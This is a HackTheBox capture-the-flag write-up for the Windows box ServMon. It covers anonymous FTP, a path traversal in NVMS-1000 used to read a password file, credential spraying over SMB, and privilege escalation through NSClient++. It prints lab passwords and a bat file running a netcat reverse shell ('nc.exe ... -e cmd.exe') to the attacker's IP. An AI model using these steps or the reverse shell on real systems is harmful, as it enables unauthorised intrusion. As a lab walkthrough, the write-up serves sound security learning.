---
title: HackTheBox ServMon
author: Marius Kimmina
date: 2020-06-21 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [ftp, Windows, path traversal]
published: true
---


## 0x0 Introduction
Yet another Windows box. In this one  we use anonymous ftp access to find out about the existens of some internal files and then abuse a path traversal vulnerability to get hold of these files. Once we are on the box we use an exploit for NSClient++ to escalate privileges to System. 
![image](/assets/images/ServMon/servmon-pic.png "ServMon")

## 0x1 Getting a foothold and the user.txt

As always I started with a nmap scan (I left out some not all that relevant skript results to keep the output short)

```
$ nmap -sC -sV -oN nmap 10.10.10.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 11:52 CEST
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp   open  http
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  nrpe?
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
```
The first things to look at here are the Website, the anonymous login ftp, and maybe smb.  
The Website only gave us a login page with not much else to see tho, so lets not waste too much time there.
SMB did not allow anonymous login, which means without credentials we can't do much there either.
FTP does allow anonymous login tho and contained some interesting Information:
```
$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:mindslave): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
```
Going into the Nadine and Nathan directory we also got two .txt files the first is in Nadines directory, it's called Confidental.txt 

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
```
The second one is in Nathans directory and is called 'Notes to do.txt' (to download this file via ftp u had to use \ for the whitespaces: get Notes\ to\ do.txt)
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

I Found the NSClient that Nathan was talking about on 10.10.10.184:8443, for this I had to go take another look at the nmap result from before:
```
8443/tcp  open  https-alt
```

Upon clicking 'forgot password' on the NSClient application it told me run the following commands, what a goofy application. 
```
nscp web -- password --display
nscp web -- password --set new-password testing
```

looking up NSClient in searchsploit brought up a Priveledge escalation so this might be useful for getting the root flag latter on.  
That means once we are on the box we can get the password for NSClient++ easily and possibly get root that way, right now that's not very helpful tho, so lets move on.
Next thing that I looked for was anonymous access to the rpcclient but with no success
```
rpcclient -U "" -N 10.10.10.184                                                                                                                          
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

Now I started looking into this 'napster' thing thats running on the box on port 6699, seems to be some music download service, a very old one tho, there are only 2 public cve's for napster one from 1999 and one from 2000.


Tried to exploit the nrpe (part of nagios) that's running on the box, but no success

```
$ /usr/lib/nagios/plugins/check_nrpe -H 10.10.10.184
CHECK_NRPE: Error - Could not connect to 10.10.10.184. Check system logs on 10.10.10.184
```

So, after all of this failed, I went back to the frontdoor of the box, the nvms-1000 running on port 80. It turns out that this thing has a 'path traversal' vulnerability, and since we know that nathan has a 'Passwords.txt' file on his desktop, that comes in very handy.  
I send a request to the application intercepted it with burp and used the repeater to find the 'passwords.txt' file.

![image](/assets/images/ServMon/Burp-path-traversal.png "path traversal")

Now I have a few possible passwords:
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

none of these worked on nvms-1000 nor on NSClient++ but trying them out on smb gave me a hit:

```
$ crackmapexec smb 10.10.10.184 -u Nathan -p pw.txt 
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:SERVMON) (signing:False) (SMBv1:False)                         
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE                                                            
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE                                                       
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE                                                            
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE                                                              
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE                                                         
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE                                                          
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE

$ crackmapexec smb 10.10.10.184 -u Nadine -p pw.txt                                                                                 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE                                                            
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE                                                       
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE                                                            
SMB         10.10.10.184    445    SERVMON          [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk
```

```
$ smbmap -u Nadine -p 'L1k3B1gBut7s@W0rk' -H 10.10.10.184 
[+] IP: 10.10.10.184:445        Name: 10.10.10.184                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

And it also worked for as Nadines ssh password, which gave us the user.txt
```
nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
23/05/2020  10:23                34 user.txt
```

# 0x02 Getting the root.txt
Now that we are logged in as Nadine we can get the password for the nsclient++ instance that we have discovered before
```
nadine@SERVMON C:\>"Program Files\NSClient++\nscp.exe" web -- password --display
Current password: ew2x6SsGTxjRwXOT
```
Because the page is only accessible from localhost we had to use ssh port forwarding to access the nsclient++ from our maschine. 
```
$ ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
```


Next, there are 2 things we need to copy over to the ServMon maschine, first a bat file with the following content to execute netcat:

```
@echo off
c:\temp\nc.exe 10.10.14.103 9001 -e cmd.exe
```

And of course the nc.exe itself, to bring both of these over to ServMon I used scp:

```
$ scp boese.bat nadine@10.10.10.184:/temp
$ scp nc.exe nadine@10.10.10.184:/temp
```

Now we configure the NSClient++ to run our boese.bat file, and since NSClient++ has to run with root or system privileges, this will give us a shell as System.

![image](/assets/images/ServMon/nsclient-script.png "NSClient++")

Once you have that configured you hit Control -> Reload, wait a second or two and you will have your shell as System

![image](/assets/images/ServMon/servmon-system.png "We are system")
